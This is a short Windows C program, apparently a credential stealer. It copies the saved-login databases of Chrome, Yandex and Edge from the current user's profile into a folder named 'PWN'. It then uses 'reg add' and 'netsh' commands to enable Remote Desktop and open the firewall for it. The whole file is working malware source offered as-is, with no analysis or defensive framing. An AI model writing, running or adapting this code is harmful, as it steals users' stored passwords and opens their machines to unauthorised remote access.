#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>

void copy_file(const char *source, const char *destination) {
    FILE *src = fopen(source, "rb");
    if (src == NULL) {
        perror("Error opening source file");
        return;
    }

    FILE *dest = fopen(destination, "wb");
    if (dest == NULL) {
        perror("Error opening destination file");
        fclose(src);
        return;
    }

    char buffer[1024];
    size_t bytes;

    while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, bytes, dest);
    }

    fclose(src);
    fclose(dest);
    printf("File successfully copied: %s -> %s\n", source, destination);
}

int main() {
    char username[256];
    DWORD username_len = sizeof(username);

    if (!GetUserName(username, &username_len)) {
        printf("Error getting username.\n");
        return 1;
    }

    const char *browsers[] = {
        "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", // Google Chrome
        "C:\\Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data", // Yandex
        "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", // Microsoft Edge
        "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data For Account", // Google Chrome
        "C:\\Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data For Account", // Yandex
        "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data For Account", // Microsoft Edge
        };

    srand(time(NULL));
    int random_number = rand() % 100000;

    for (int i = 0; i < sizeof(browsers) / sizeof(browsers[0]); i++) {
        char source[256];
        snprintf(source, sizeof(source), browsers[i], username);

        char destination[256];
        snprintf(destination, sizeof(destination), "PWN/Login-%05d-%d-%s", random_number, i + 1, username);

        copy_file(source, destination);
    }

    system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"); //enable RDP
    system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\ Services\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    system("netsh advfirewall firewall set rule group=\" remote desktop\" new enable=yes"); //disable firewall

    return 0;
}
